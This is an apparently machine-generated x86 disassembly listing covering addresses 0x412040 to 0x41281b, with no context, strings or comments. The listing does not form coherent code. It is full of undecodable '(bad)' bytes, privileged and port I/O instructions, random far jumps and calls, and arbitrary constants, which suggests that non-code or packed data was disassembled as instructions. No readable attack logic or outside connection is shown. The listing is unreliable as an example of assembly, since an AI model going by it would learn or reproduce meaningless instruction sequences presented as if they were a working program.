  412040:	push   es
  412041:	sar    DWORD PTR [esi+0x215f849a],0xfb
  412048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412049:	stos   DWORD PTR es:[edi],eax
  41204a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41204b:	jnp    0x41203e
  41204d:	pop    ecx
  41204e:	inc    edx
  41204f:	and    esi,ebx
  412051:	scas   al,BYTE PTR es:[edi]
  412052:	xchg   ecx,eax
  412053:	ror    BYTE PTR [ebx+edi*2-0x1cdbf3b2],cl
  41205a:	scas   al,BYTE PTR es:[edi]
  41205b:	imul   eax,DWORD PTR [eax-0x184f7ad8],0x3699594a
  412065:	adc    BYTE PTR ds:0x86d9ec4d,bl
  41206b:	xchg   ecx,eax
  41206c:	sub    ebx,DWORD PTR [esi-0x42]
  41206f:	popf   
  412070:	test   DWORD PTR [ecx+eax*2+0x2c3a6ed6],0x51c2527a
  41207b:	gs into 
  41207d:	dec    ebx
  41207e:	sti    
  41207f:	sahf   
  412080:	dec    eax
  412081:	iret   
  412082:	cdq    
  412083:	xchg   esi,eax
  412084:	cwde   
  412085:	mov    dh,BYTE PTR cs:[ecx]
  412088:	lahf   
  412089:	sbb    bl,cl
  41208b:	mov    cl,BYTE PTR [ebx]
  41208d:	mov    al,0xbb
  41208f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412090:	mov    ecx,0x4cff3c9
  412095:	repnz push edi
  412097:	xchg   ebp,eax
  412098:	loopne 0x412095
  41209a:	es add al,0xae
  41209d:	cmp    eax,0x52398efc
  4120a2:	or     eax,0xa6e59075
  4120a7:	inc    esp
  4120a8:	jno    0x4120ad
  4120aa:	ror    BYTE PTR [esi+ebx*1],cl
  4120ad:	mov    esi,es
  4120af:	mov    BYTE PTR [edx+0x65],ch
  4120b2:	(bad)  
  4120b3:	out    dx,eax
  4120b4:	push   edx
  4120b5:	popa   
  4120b6:	imul   edi,DWORD PTR [edi+0x43],0x705fed3c
  4120bd:	rol    DWORD PTR [ecx+0x5b],1
  4120c0:	(bad)  
  4120c1:	push   ebp
  4120c2:	sbb    BYTE PTR [ebx+0x64baf72c],ah
  4120c8:	cmp    DWORD PTR [edi],ebp
  4120ca:	push   eax
  4120cb:	push   esi
  4120cc:	or     DWORD PTR [esp+edi*4],0x15
  4120d0:	loope  0x412117
  4120d2:	sahf   
  4120d3:	lahf   
  4120d4:	push   esi
  4120d5:	cmp    eax,0x46f196f2
  4120da:	imul   edx,DWORD PTR [edx+edi*2+0x6794a05],0x6b248471
  4120e5:	sti    
  4120e6:	enter  0x16a1,0xe8
  4120ea:	add    BYTE PTR [ecx-0x5c],ah
  4120ed:	dec    eax
  4120ee:	mov    ds:0x7c0e1d21,eax
  4120f3:	dec    ecx
  4120f4:	lds    ebp,FWORD PTR [ecx+eiz*4-0xb]
  4120f8:	arpl   WORD PTR [ecx],sp
  4120fa:	add    DWORD PTR [ebp-0x5f],edx
  4120fd:	mov    ebp,0x85f1872d
  412102:	popf   
  412103:	and    al,0xc
  412105:	mov    edi,ecx
  412107:	call   0x7958:0x50ebf1e7
  41210e:	sub    DWORD PTR [eax],ebp
  412110:	iret   
  412111:	(bad)  [eax]
  412113:	pusha  
  412114:	dec    edi
  412115:	jb     0x41217d
  412117:	scas   al,BYTE PTR es:[edi]
  412118:	mov    ah,0xc5
  41211a:	sub    dl,al
  41211c:	inc    ebp
  41211d:	repz ror bl,cl
  412120:	scas   eax,DWORD PTR es:[edi]
  412121:	jmp    0xe672:0x83cd96c2
  412128:	push   0x87ba401e
  41212d:	sub    edx,DWORD PTR [eax+0x37e7e85a]
  412133:	scas   eax,DWORD PTR es:[edi]
  412134:	jne    0x4120e7
  412136:	dec    eax
  412137:	arpl   WORD PTR [ebx-0x16],si
  41213a:	mov    edx,ebx
  41213c:	pop    edi
  41213d:	das    
  41213e:	and    al,0x3a
  412140:	push   ebp
  412141:	pop    esp
  412142:	xor    al,0x5a
  412144:	jnp    0x4120f9
  412146:	iret   
  412147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412148:	je     0x41219e
  41214a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41214b:	repnz rol BYTE PTR [esi+0x0],1
  41214f:	fs cwde 
  412151:	jo     0x41213c
  412153:	dec    ebx
  412154:	lods   al,BYTE PTR ds:[esi]
  412155:	add    al,0xb8
  412157:	not    dl
  412159:	(bad)  
  41215a:	sub    eax,0x86582584
  41215f:	add    ah,BYTE PTR [ebp-0x68b88693]
  412165:	or     al,0x7c
  412167:	and    ecx,ecx
  412169:	cli    
  41216a:	dec    edx
  41216b:	mov    ebx,0x1825f61c
  412170:	mov    bh,0x5
  412172:	or     esi,ecx
  412174:	and    eax,0x7ab7abc7
  412179:	mov    ch,cl
  41217b:	pop    esp
  41217c:	jae    0x4121d6
  41217e:	es jecxz 0x41213d
  412181:	cmp    BYTE PTR [esi],0xe1
  412184:	ret    
  412185:	out    0x87,eax
  412187:	aas    
  412188:	push   ebp
  412189:	and    al,0x9
  41218b:	dec    edi
  41218c:	cs xbegin 0x87d26602
  412193:	jmp    0x412168
  412195:	sub    ebp,DWORD PTR [edi]
  412197:	ja     0x4121ab
  412199:	aad    0xc5
  41219b:	ds sbb esi,esi
  41219e:	mov    cl,0x4
  4121a0:	sahf   
  4121a1:	lods   al,BYTE PTR ds:[esi]
  4121a2:	addr16 cwde 
  4121a4:	and    edi,DWORD PTR [ebp-0x55]
  4121a7:	inc    eax
  4121a8:	pop    ds
  4121a9:	outs   dx,BYTE PTR ds:[esi]
  4121aa:	(bad)  
  4121ac:	pop    edx
  4121ad:	jecxz  0x412183
  4121af:	push   ebx
  4121b0:	aam    0x6a
  4121b2:	test   ecx,esp
  4121b4:	mov    ah,0x59
  4121b6:	nop
  4121b7:	mov    BYTE PTR [eax-0x36],al
  4121ba:	dec    esi
  4121bb:	mov    eax,ds:0x919dbbf4
  4121c0:	and    al,0x6f
  4121c2:	stos   BYTE PTR es:[edi],al
  4121c3:	iret   
  4121c4:	(bad)  
  4121c5:	(bad)  
  4121c6:	sbb    al,0x9f
  4121c8:	mov    bl,al
  4121ca:	xchg   ebp,eax
  4121cb:	mov    dl,0xb7
  4121cd:	inc    edi
  4121ce:	int    0x2a
  4121d0:	mov    ebx,0x9fae51f
  4121d5:	ret    0x5a56
  4121d8:	les    eax,FWORD PTR [esi]
  4121da:	fist   WORD PTR [eax-0x4e5925e8]
  4121e0:	sub    eax,0x1f1ac49b
  4121e5:	jg     0x4121dd
  4121e7:	xchg   edx,eax
  4121e8:	mov    al,ds:0xf2ad1770
  4121ed:	shr    BYTE PTR gs:[esi-0x6e6422e8],0xfa
  4121f5:	popa   
  4121f6:	mov    eax,ds:0xd0dd49bf
  4121fb:	sahf   
  4121fc:	ins    DWORD PTR es:[edi],dx
  4121fd:	(bad)  
  4121fe:	xor    dh,BYTE PTR [esi]
  412200:	inc    ebp
  412202:	jle    0x41219b
  412204:	rol    DWORD PTR [esi],0x44
  412207:	push   0x65
  412209:	pop    ebx
  41220a:	popa   
  41220b:	(bad)  
  41220d:	add    ah,ah
  41220f:	pop    esp
  412210:	leave  
  412211:	xor    ah,BYTE PTR ds:0xa547b49d
  412217:	test   edi,esi
  412219:	mov    DWORD PTR [edi+0x3c5c803],edx
  41221f:	cmp    DWORD PTR [edi-0x26],ebp
  412222:	sbb    BYTE PTR [ebp+0x33141a45],0x85
  412229:	or     ah,BYTE PTR [edx+0x7a39e0a6]
  41222f:	dec    cx
  412231:	popa   
  412232:	dec    edx
  412233:	into   
  412234:	push   cs
  412235:	sbb    ah,BYTE PTR [eax-0x320f9439]
  41223b:	lods   eax,DWORD PTR ds:[esi]
  41223c:	popf   
  41223d:	repz jecxz 0x412278
  412240:	test   ebp,esi
  412242:	cwde   
  412243:	pusha  
  412244:	cmc    
  412245:	outs   dx,BYTE PTR ds:[esi]
  412246:	jnp    0x4122a1
  412248:	test   BYTE PTR [eax+0x5867a58d],dl
  41224e:	mov    ch,0x22
  412250:	mov    ecx,0xd23f491
  412255:	jo     0x412296
  412257:	pop    esi
  412258:	xor    al,0x81
  41225a:	jb     0x412227
  41225c:	rcl    edx,1
  41225e:	jg     0x41224a
  412260:	(bad)  
  412261:	(bad)  
  412262:	lock xchg edi,eax
  412264:	sbb    al,0x7d
  412266:	push   ebx
  412267:	and    edx,edi
  412269:	add    BYTE PTR [eax-0x225eeb5b],dh
  41226f:	xchg   edi,eax
  412270:	div    DWORD PTR [edx+0x15363e93]
  412276:	test   eax,0x2dc2658c
  41227b:	ds fwait
  41227d:	inc    eax
  41227e:	leave  
  41227f:	mov    al,0xfa
  412281:	and    eax,0x2f9c91c9
  412286:	jmp    0x4ad743f9
  41228b:	(bad)  
  41228c:	jns    0x41230d
  41228e:	data16 ja 0x4122b1
  412291:	int    0xf4
  412293:	(bad)  
  412294:	int3   
  412295:	sub    al,0xa1
  412297:	add    eax,0x5e5a29ee
  41229c:	sbb    al,0x1c
  41229e:	xchg   edx,eax
  41229f:	push   esp
  4122a0:	cmp    eax,0x2c2ff22f
  4122a5:	or     DWORD PTR [eax-0x78],edx
  4122a8:	sub    eax,0x834e8241
  4122ad:	xor    al,0x9c
  4122af:	cmp    BYTE PTR [edx+0x2ef818a],ch
  4122b5:	aad    0x98
  4122b7:	push   ebp
  4122b8:	pop    esp
  4122b9:	fwait
  4122ba:	or     eax,DWORD PTR [ebx+0x79]
  4122bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122be:	in     al,0x63
  4122c0:	es je  0x4122a9
  4122c3:	ins    DWORD PTR es:[edi],dx
  4122c4:	cli    
  4122c5:	popa   
  4122c6:	add    cl,BYTE PTR [edi+0x1a]
  4122c9:	mov    bl,0x5c
  4122cb:	inc    BYTE PTR [ecx]
  4122cd:	out    dx,al
  4122ce:	push   ebx
  4122cf:	(bad)  
  4122d0:	arpl   WORD PTR [ebp-0x6d],bx
  4122d3:	imul   esi,DWORD PTR [eax+edi*4],0xffffffd0
  4122d7:	or     bl,dh
  4122d9:	in     eax,dx
  4122da:	cwde   
  4122db:	pop    ds
  4122dc:	push   cs
  4122dd:	jbe    0x412323
  4122df:	xchg   edx,eax
  4122e0:	inc    esi
  4122e1:	pop    ss
  4122e2:	lds    esi,FWORD PTR [eax]
  4122e4:	add    bh,BYTE PTR [edi-0x68aa371b]
  4122ea:	or     edi,DWORD PTR [ebp-0x11222513]
  4122f0:	rol    DWORD PTR [edx-0x11],1
  4122f3:	adc    cl,cl
  4122f5:	loopne 0x4122e2
  4122f7:	xor    cl,BYTE PTR [edx-0x1ca331b5]
  4122fd:	fcomp  QWORD PTR [edi+0xe]
  412300:	rol    DWORD PTR ds:0xf9aeee60,0x74
  412307:	lods   eax,DWORD PTR ds:[esi]
  412308:	sbb    bl,BYTE PTR [esi+0x32]
  41230b:	mov    ds:0x3cce8eb1,eax
  412310:	mov    dh,0xa0
  412312:	jno    0x4122a1
  412314:	idiv   BYTE PTR [ebp-0x11]
  412317:	and    BYTE PTR [ebp+0x67],al
  41231a:	int3   
  41231b:	out    dx,al
  41231c:	mov    DWORD PTR [ebx],esi
  41231e:	mov    ch,0x34
  412320:	sub    bh,dh
  412322:	adc    ebx,DWORD PTR [esi-0x26]
  412325:	jmp    0x412315
  412327:	(bad)  
  412328:	aas    
  412329:	sbb    eax,0xce3a30c9
  41232e:	in     eax,dx
  41232f:	ret    
  412330:	xor    DWORD PTR [ebx+ecx*1-0x41],eax
  412334:	out    dx,al
  412335:	push   ds
  412336:	mov    eax,0x2102f5a
  41233b:	inc    esp
  41233c:	stc    
  41233d:	jb     0x4122bf
  41233f:	push   esp
  412340:	(bad)  
  412341:	sahf   
  412342:	xchg   edi,eax
  412343:	xchg   esp,eax
  412344:	xchg   ecx,eax
  412345:	(bad)  
  412346:	ins    DWORD PTR es:[edi],dx
  412347:	mov    BYTE PTR [ebx],dh
  412349:	mov    ch,0xd5
  41234b:	outs   dx,DWORD PTR ds:[esi]
  41234c:	xchg   ebx,eax
  41234d:	stc    
  41234e:	shr    eax,0x2f
  412351:	(bad)  
  412352:	and    esi,DWORD PTR [ecx-0x3215db20]
  412358:	xchg   esp,eax
  412359:	lds    esi,FWORD PTR [ecx+0x2c97636c]
  41235f:	xor    DWORD PTR [edx],esp
  412361:	add    al,0xd2
  412363:	inc    edx
  412364:	(bad)  
  412365:	test   eax,0x37e45fbc
  41236a:	dec    esi
  41236b:	mov    ecx,0xf2724f4f
  412370:	retf   0x3002
  412373:	ins    BYTE PTR es:[edi],dx
  412374:	pop    ebp
  412375:	int    0x63
  412377:	lods   eax,DWORD PTR ds:[esi]
  412378:	jmp    0x1959:0x237f18ee
  41237f:	sub    DWORD PTR [esi-0x72],ebx
  412382:	gs pop ebx
  412384:	xor    eax,0x8b42ac05
  412389:	pop    ds
  41238a:	cmp    dh,BYTE PTR [ebx+0x2a]
  41238d:	lds    esi,FWORD PTR [edi+0x55b46ad2]
  412393:	inc    ebx
  412394:	cmp    DWORD PTR [ebp+0x5169d837],edi
  41239a:	out    0x31,al
  41239c:	enter  0xefed,0x65
  4123a0:	stos   BYTE PTR es:[edi],al
  4123a1:	jae    0x412327
  4123a3:	push   ecx
  4123a4:	mov    ebx,DWORD PTR [ebx-0x20]
  4123a7:	push   ebp
  4123a8:	arpl   WORD PTR [ebx],si
  4123aa:	push   ecx
  4123ab:	adc    al,0x89
  4123ad:	sahf   
  4123ae:	and    ebp,DWORD PTR [eax-0x64]
  4123b1:	pop    eax
  4123b2:	add    al,al
  4123b4:	push   0x5176b547
  4123b9:	inc    edi
  4123ba:	jmp    0x6603:0x55be44cd
  4123c1:	inc    ebx
  4123c2:	rcr    DWORD PTR [eax+eiz*4+0x57fb2667],1
  4123c9:	xor    al,0x10
  4123cb:	mov    ds:0xade5b98b,al
  4123d0:	outs   dx,DWORD PTR ds:[esi]
  4123d1:	xor    ebp,DWORD PTR [esi+eax*8-0x5a]
  4123d5:	cwde   
  4123d6:	outs   dx,DWORD PTR ds:[esi]
  4123d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123d8:	mov    edx,DWORD PTR [ecx-0x42]
  4123db:	lock leave 
  4123dd:	mov    al,0xbb
  4123df:	ss jp  0x412387
  4123e2:	pusha  
  4123e3:	out    0x41,eax
  4123e5:	test   eax,0x71a60c07
  4123ea:	adc    BYTE PTR [esi-0x30315e99],bh
  4123f0:	xor    al,0xa8
  4123f2:	jno    0x4123bd
  4123f4:	(bad)  
  4123f5:	ret    0xc8dd
  4123f8:	mov    ebp,ss
  4123fa:	xor    eax,0x850f3688
  4123ff:	ja     0x41246d
  412401:	adc    eax,0xdd8026b2
  412406:	sub    al,0x3c
  412408:	inc    ecx
  412409:	mov    bh,0x34
  41240b:	mul    BYTE PTR [ecx+0x12]
  41240e:	mov    edx,DWORD PTR [ecx+0x58d5ccc1]
  412414:	test   BYTE PTR [edi-0x15733b9c],dl
  41241a:	rol    esi,1
  41241c:	adc    esp,DWORD PTR [ebx+0x542d6370]
  412422:	ss rep ins BYTE PTR es:[edi],dx
  412425:	inc    esp
  412426:	fbstp  TBYTE PTR [esi+0x3f]
  412429:	gs mov dh,0x86
  41242c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41242d:	mov    ds:0xfb019dc4,eax
  412432:	pusha  
  412433:	fisttp DWORD PTR [edi-0x61]
  412436:	xchg   ebp,eax
  412437:	sbb    bh,bl
  412439:	shl    DWORD PTR [ebx-0x1148c245],1
  41243f:	mov    ds:0x7df6e0d6,eax
  412444:	xchg   ecx,eax
  412445:	(bad)  
  412446:	jl     0x4124c1
  412448:	and    esp,edx
  41244a:	inc    edx
  41244b:	jo     0x41249b
  41244d:	cmp    DWORD PTR [edx],0x2275b7cb
  412453:	sbb    BYTE PTR [ebx+0x60],0xc6
  412457:	mov    dl,0xcf
  412459:	(bad)  
  41245a:	cmc    
  41245b:	outs   dx,DWORD PTR ds:[esi]
  41245c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41245d:	adc    BYTE PTR [ecx],dh
  41245f:	sbb    dx,si
  412462:	cmc    
  412463:	jmp    0xaa13:0xbeab3417
  41246a:	ret    0xb3ef
  41246d:	jecxz  0x41246e
  41246f:	pop    edi
  412470:	dec    edx
  412471:	jmp    0x96eb:0xadc9cf57
  412478:	sar    BYTE PTR [bp+0x160f],1
  41247d:	xlat   BYTE PTR ds:[ebx]
  41247e:	sbb    dl,BYTE PTR [edi-0x74]
  412481:	ret    0xbe9b
  412484:	popf   
  412485:	fdiv   QWORD PTR [ebp-0x41e90ae8]
  41248b:	pop    edx
  41248c:	paddb  mm1,mm6
  41248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412490:	xchg   ebp,eax
  412491:	nop
  412492:	sub    eax,0x2ad8753
  412497:	jge    0x4124fd
  412499:	das    
  41249a:	jo     0x412490
  41249c:	push   es
  41249d:	mov    ds:0x71ef1c44,eax
  4124a2:	enter  0x194c,0x3b
  4124a6:	jmp    0xb312:0xf55bd0bb
  4124ad:	test   BYTE PTR [edi],ah
  4124af:	rcr    BYTE PTR [eax+0x3c6169b],0xf4
  4124b6:	scas   al,BYTE PTR es:[edi]
  4124b7:	cmp    dh,BYTE PTR [esi]
  4124b9:	xchg   ebp,eax
  4124ba:	rol    DWORD PTR [edi],cl
  4124bc:	sbb    DWORD PTR [ecx-0x2b],0xffffffa6
  4124c0:	arpl   WORD PTR [edx-0x39],cx
  4124c3:	lock aad 0x4
  4124c6:	mov    eax,0x3d028b5f
  4124cb:	shl    DWORD PTR [esi-0x1c],cl
  4124ce:	clc    
  4124cf:	inc    esi
  4124d0:	shl    DWORD PTR [edx-0x23],cl
  4124d3:	gs test al,0x90
  4124d6:	and    eax,0x20648598
  4124db:	and    DWORD PTR [edi+0x545f0fd1],eax
  4124e1:	(bad)  
  4124e2:	jb     0x4124ef
  4124e4:	call   0x2543:0x69d59407
  4124eb:	adc    eax,0x73fca2b7
  4124f0:	hlt    
  4124f1:	xor    al,0x46
  4124f3:	rcr    BYTE PTR [edi+0x46b9b853],1
  4124f9:	pop    ss
  4124fa:	out    dx,eax
  4124fb:	jp     0x412482
  4124fd:	ror    eax,cl
  4124ff:	xor    eax,0xa60b204d
  412504:	or     DWORD PTR [ebp-0x10],0xca4a917b
  41250b:	mov    ecx,0x5acfb509
  412510:	mov    bh,0x58
  412512:	aam    0x6c
  412514:	xor    DWORD PTR [edi],edi
  412516:	in     al,dx
  412517:	pusha  
  412518:	push   eax
  412519:	fisub  DWORD PTR [ebx]
  41251b:	jg     0x412544
  41251d:	jbe    0x4124e9
  41251f:	out    0x4a,al
  412521:	jno    0x412581
  412523:	jnp    0x41256b
  412525:	mov    al,ds:0x9a28ab36
  41252a:	jmp    0x91d:0x5c63281a
  412531:	sbb    ecx,DWORD PTR [eax-0x7]
  412534:	(bad)  
  412536:	and    edx,DWORD PTR [ebp+0x8]
  412539:	int3   
  41253a:	ficomp DWORD PTR [edx+edx*1-0x45516900]
  412541:	adc    eax,0x4268200e
  412546:	lock dec edi
  412548:	add    DWORD PTR [edi],esp
  41254a:	bnd jle 0x412569
  41254d:	and    al,0x33
  41254f:	add    eax,0x4479dbfd
  412554:	inc    edx
  412555:	cli    
  412556:	inc    esi
  412557:	mov    bl,0x34
  412559:	mov    edx,0x4200d61d
  41255e:	pop    eax
  41255f:	int3   
  412560:	sar    BYTE PTR [ecx],1
  412562:	ss (bad) 
  412564:	imul   edx
  412566:	mov    cl,BYTE PTR [esi-0x5b]
  412569:	fld    QWORD PTR cs:[edi+0x35]
  41256d:	popf   
  41256e:	pop    eax
  41256f:	imul   ebp,DWORD PTR [ebp-0x7d],0x3c5681e4
  412576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412577:	mov    bh,0x91
  412579:	mov    edx,0x90504e94
  41257e:	(bad)  
  412580:	add    bl,BYTE PTR [esi+0xefab14e]
  412586:	lea    ebp,[edx+0x3df879ac]
  41258c:	fnstsw WORD PTR [edi+0x13]
  41258f:	(bad)  
  412590:	and    edx,esi
  412592:	inc    edx
  412593:	mov    ebp,0x8ad8453b
  412598:	frstor [ecx+0x5a6df540]
  41259e:	mov    ds:0xf9b405da,al
  4125a3:	sub    ah,ch
  4125a5:	mov    edi,0x53e19d0e
  4125aa:	push   ss
  4125ab:	call   0xdc25:0x42fa6023
  4125b2:	xchg   DWORD PTR [ecx],eax
  4125b4:	or     al,0xa5
  4125b6:	daa    
  4125b7:	pop    eax
  4125b8:	sbb    eax,0x3b5cac72
  4125bd:	rcl    dl,cl
  4125bf:	sub    BYTE PTR [edx-0x68ad3f5b],bl
  4125c5:	add    BYTE PTR [bx+di+0x2b],0xe4
  4125ca:	(bad)  
  4125cb:	adc    eax,0x1ca9a8eb
  4125d0:	movq   QWORD PTR [ecx-0x29],mm4
  4125d4:	sub    eax,DWORD PTR [eax-0x1f795003]
  4125da:	retf   
  4125db:	imul   esp
  4125dd:	sbb    ch,BYTE PTR [ebx]
  4125df:	and    al,0x7
  4125e1:	mov    dl,0xf7
  4125e3:	pop    esp
  4125e4:	ss stos BYTE PTR es:[edi],al
  4125e6:	xor    dl,BYTE PTR [ebp-0x4f6fd6e2]
  4125ec:	(bad)  
  4125ed:	shr    eax,0x5d
  4125f0:	daa    
  4125f1:	jmp    DWORD PTR [ebx+0x70]
  4125f4:	lods   al,BYTE PTR ds:[esi]
  4125f5:	pop    esp
  4125f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125f7:	fimul  DWORD PTR [ebp+ebp*4+0x20]
  4125fb:	dec    esi
  4125fc:	das    
  4125fd:	cmp    DWORD PTR [ecx+ebp*2-0x13c77ffc],edx
  412604:	pop    es
  412605:	add    cl,BYTE PTR [edi+0x4c]
  412608:	sbb    ecx,DWORD PTR [ebx+0x6]
  41260b:	sbb    edi,DWORD PTR [eax+0x2d]
  41260e:	lds    esp,FWORD PTR [edx+0x67e054c7]
  412614:	xchg   edx,esp
  412616:	div    DWORD PTR [edx+0x4d]
  412619:	mov    al,0x4d
  41261b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41261c:	aad    0x50
  41261e:	mov    eax,0xf5f6d390
  412623:	js     0x412677
  412625:	xchg   DWORD PTR [edx+eax*4+0x2f2b7d37],esp
  41262c:	jge    0x41261a
  41262e:	sbb    eax,0x5ccfd93a
  412633:	cld    
  412634:	and    eax,0x3df59da3
  412639:	imul   ebp,DWORD PTR [edi+0x62661012],0x8e8d9ab6
  412643:	div    DWORD PTR [eax]
  412645:	scas   eax,DWORD PTR es:[edi]
  412646:	fisttp QWORD PTR [esi-0x790f8939]
  41264c:	arpl   WORD PTR [edx],dx
  41264e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41264f:	mov    edx,0x2251c989
  412654:	push   ds
  412655:	prefetcht2 BYTE PTR [eax-0x55e816d9]
  41265c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41265d:	lea    ecx,[edx+0x546c7fa4]
  412663:	xor    eax,DWORD PTR [edi+0x4b]
  412666:	pop    esp
  412667:	retf   
  412668:	outs   dx,DWORD PTR ds:[esi]
  412669:	aaa    
  41266a:	pop    edi
  41266b:	punpcklbw mm4,mm7
  41266e:	(bad)  
  41266f:	dec    edx
  412670:	jmp    DWORD PTR [eax+0x3e6aa278]
  412676:	sub    DWORD PTR [esi],esp
  412678:	jae    0x41262a
  41267a:	mov    edx,0x141056fc
  41267f:	ret    0x4555
  412682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412683:	push   ds
  412684:	add    dh,ch
  412686:	add    al,0x63
  412688:	pop    es
  412689:	inc    ecx
  41268a:	mov    ah,0x80
  41268c:	stos   DWORD PTR es:[edi],eax
  41268d:	jb     0x41262b
  41268f:	pop    edi
  412690:	fs jp  0x4126bb
  412693:	dec    ebp
  412694:	xchg   edi,eax
  412695:	pop    ebx
  412696:	pop    esp
  412697:	mov    DWORD PTR [ecx+esi*1+0x617205e5],esi
  41269e:	or     edi,DWORD PTR [eax]
  4126a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126a1:	xor    al,0x2b
  4126a3:	pop    ds
  4126a4:	pop    edx
  4126a5:	mov    edi,0x2f360af0
  4126aa:	adc    BYTE PTR [esp+edi*2-0x32],al
  4126ae:	sbb    al,0xdd
  4126b0:	mov    DWORD PTR [eax],0xe13c6fc6
  4126b6:	jp     0x4126fa
  4126b8:	mov    ah,0x25
  4126ba:	addr16 (bad) 
  4126bc:	jns    0x4126d8
  4126be:	frstor [ecx+0xe]
  4126c1:	ins    BYTE PTR es:[edi],dx
  4126c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126c3:	or     BYTE PTR [ebp+0x6dbb6364],bl
  4126c9:	cmp    eax,DWORD PTR [esi]
  4126cb:	xchg   esi,eax
  4126cc:	add    eax,0xd9300d4d
  4126d1:	pusha  
  4126d2:	adc    bl,BYTE PTR [eax+eiz*2]
  4126d5:	jmp    0x41269f
  4126d7:	xlat   BYTE PTR ds:[ebx]
  4126d8:	out    0xc,eax
  4126da:	stos   BYTE PTR es:[edi],al
  4126db:	or     eax,0x4a6a3c80
  4126e0:	rcl    DWORD PTR [edx+eax*2-0x7f],1
  4126e4:	and    ch,BYTE PTR [edi]
  4126e6:	mov    edx,0xec826896
  4126eb:	pushf  
  4126ec:	sbb    DWORD PTR [ebp+0x629b4b9d],ebx
  4126f2:	fwait
  4126f3:	or     al,0xbf
  4126f5:	fdivr  QWORD PTR [ebx-0x42]
  4126f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126f9:	cwde   
  4126fa:	cdq    
  4126fb:	xor    esi,ecx
  4126fd:	in     eax,dx
  4126fe:	adc    BYTE PTR ss:[ebp+edx*4+0x76],bh
  412703:	jae    0x4126f7
  412705:	repnz jmp 0x80fa:0xb3d18201
  41270d:	call   0xb62:0x87fdcba5
  412714:	xlat   BYTE PTR ds:[ebx]
  412715:	sti    
  412716:	mov    DWORD PTR [edi],ecx
  412718:	imul   esp,DWORD PTR [ecx],0x47c86b2e
  41271e:	xor    al,0xda
  412720:	ja     0x412785
  412722:	mov    WORD PTR [ebp+0x4fecae2b],?
  412728:	loope  0x41275d
  41272a:	jns    0x41277c
  41272c:	test   ah,bl
  41272e:	dec    esp
  41272f:	inc    esp
  412730:	aas    
  412731:	lods   eax,DWORD PTR ds:[esi]
  412732:	stos   BYTE PTR es:[edi],al
  412733:	test   eax,0xcfdc0431
  412738:	mov    ds:0x544ab66b,eax
  41273d:	xchg   edx,eax
  41273e:	ds inc ecx
  412740:	pop    eax
  412741:	mov    bh,0xc6
  412743:	pop    edx
  412744:	mov    dh,0xc2
  412746:	rol    DWORD PTR [esi],1
  412748:	sub    BYTE PTR [ebp-0x6245f014],dh
  41274e:	aad    0xbd
  412750:	push   ss
  412751:	aam    0xe8
  412753:	cli    
  412754:	dec    edi
  412755:	mov    edi,0xd81123ae
  41275a:	and    BYTE PTR [ebx+eiz*4+0x27],0x53
  41275f:	pmulhw mm6,QWORD PTR [ebx+0x7e]
  412763:	xor    bl,BYTE PTR [edi+0x623929ab]
  412769:	push   ss
  41276a:	cmp    al,bl
  41276c:	loop   0x4127d5
  41276e:	adc    edx,ebp
  412770:	mov    edi,0xfbd13e77
  412775:	jne    0x4127f2
  412777:	mov    ebx,0xb42a33d7
  41277c:	xor    BYTE PTR [edi-0x511e0830],bl
  412782:	jg     0x41270f
  412784:	push   eax
  412785:	mov    BYTE PTR [ecx+0x7729e0c5],bl
  41278b:	and    ch,al
  41278d:	fcom   DWORD PTR [ebx+0x77]
  412790:	in     eax,0xc1
  412792:	or     bh,BYTE PTR [eax-0x4]
  412795:	nop
  412796:	cli    
  412797:	push   ecx
  412798:	mov    edx,0x68e801ed
  41279d:	test   DWORD PTR [edx+0x63bbfc16],esp
  4127a3:	(bad)  
  4127a4:	cmp    BYTE PTR [ebp+ecx*2+0x5fd0d633],cl
  4127ab:	mov    ah,ch
  4127ad:	ins    BYTE PTR es:[edi],dx
  4127ae:	fwait
  4127af:	mov    ss,WORD PTR [edi+0x75]
  4127b2:	daa    
  4127b3:	push   eax
  4127b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127b5:	mov    ebx,0xc3c1d4b
  4127ba:	sbb    eax,0x950330e2
  4127bf:	or     DWORD PTR [ebx+0x35],edi
  4127c2:	rol    ecx,cl
  4127c4:	dec    esp
  4127c5:	sub    DWORD PTR cs:[edi-0xe526c45],ebp
  4127cc:	retf   
  4127cd:	cmp    edi,DWORD PTR [edx-0x38]
  4127d0:	xchg   esi,eax
  4127d1:	ret    0xa9fd
  4127d4:	add    eax,0x57bb8e05
  4127d9:	pop    esi
  4127da:	jo     0x4127d8
  4127dc:	out    0x8a,eax
  4127de:	mov    ds:0x402b7c3f,al
  4127e3:	loop   0x4127c4
  4127e5:	pop    ebx
  4127e6:	(bad)  
  4127e7:	lock adc bl,BYTE PTR [edx+0xc12e7f7]
  4127ee:	dec    ecx
  4127ef:	push   esp
  4127f0:	mov    eax,0x71313ae3
  4127f5:	mov    ds:0x412e5762,eax
  4127fa:	ds daa 
  4127fc:	div    BYTE PTR [edx]
  4127fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127ff:	add    BYTE PTR [ebp-0x350e4416],dh
  412805:	stos   DWORD PTR es:[edi],eax
  412806:	jno    0x41284e
  412808:	data16 cld 
  41280a:	cmp    eax,0xf7a11d64
  41280f:	test   DWORD PTR [esi-0x6cdfd160],0xc1a10f22
  412819:	out    0x84,eax
  41281b:	inc    eax
